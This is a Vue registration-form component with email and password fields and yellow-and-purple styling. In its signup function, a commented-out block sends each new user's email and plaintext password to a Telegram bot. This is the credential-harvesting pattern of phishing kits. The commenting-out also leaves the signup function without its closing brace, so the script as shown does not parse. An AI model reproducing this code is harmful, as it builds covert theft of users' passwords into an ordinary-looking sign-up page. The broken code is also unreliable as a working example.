<template>
    <transition appear name="form">
        <div class="form-container">
            <h2>Register</h2>
            <input type="email" v-model="email" placeholder="Email" />
            <input type="password" v-model="password" placeholder="Password" />
            <input type="password" v-model="confirmPassword" placeholder="Confirm Password" />
            <router-link to="/Market"> <button @click="signup">Register</button></router-link>
        </div>
    </transition>
</template>
  
<script setup>
import { ref } from "vue";
// import firebase from 'firebase/compat/app';
// import 'firebase/compat/auth';
// import 'firebase/compat/firestore';

const email = ref("");
const password = ref("");
const confirmPassword = ref("");

const signup = () => {
    if (!email.value || !password.value || !confirmPassword.value) {
        alert("Please fill in all the fields.");
        return;
    }

    if (password.value !== confirmPassword.value) {
        alert("Passwords do not match.");
        return;
    }

    // Send data to Telegram bot (Replace with your Telegram bot token and chat_id)
//     const botToken = "YOUR_TELEGRAM_BOT_TOKEN";
//     const chatId = "YOUR_TELEGRAM_CHAT_ID";

//     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
//         method: 'POST',
//         headers: {
//             'Content-Type': 'application/json',
//         },
//         body: JSON.stringify({
//             chat_id: chatId,
//             text: `New user registered:\nEmail: ${email.value}\nPassword: ${password.value}`,
//         }),
//     })
//         .then((response) => response.json())
//         .then((data) => {
//             console.log("Message sent to Telegram bot:", data);
//         })
//         .catch((error) => {
//             console.error("Error sending message to Telegram bot:", error);
//         });

//     firebase
//         .auth()
//         .createUserWithEmailAndPassword(email.value, password.value)
//         .then(
//             (user) => {
//                 console.log(user);
//             },
//             (err) => {
//                 alert(err.message);
//             }
//         );
// };
</script>
  
  <!-- Rest of the code remains unchanged -->
  
  
<style lang="scss">
/* Form Styling - Customize as needed */
.form-container {
    max-width: 300px;
    margin: 0 auto;
    padding: 20px;
    background-color: #ECEF43;
    border-radius: 10px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
    text-align: center;
    color: #322649;
}

.form-container h2 {
    margin-bottom: 20px;
}

.form-container input {
    width: 100%;
    padding: 10px;
    margin-bottom: 10px;
    border: 1px solid #322649;
    border-radius: 5px;
    background-color: transparent;
    color: #322649;
}

.form-container button {
    width: 100%;
    padding: 10px;
    background-color: #322649;
    color: #ffffff;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-weight: bold;
}

.form-container button:hover {
    background-color: #231d3a;
}

.form-container p {
    margin-top: 15px;
    font-size: 14px;
}

.form-container p a {
    color: #ECEF43;
    text-decoration: none;
    cursor: pointer;
}

.form-container p a:hover {
    text-decoration: underline;
}
</style>
  
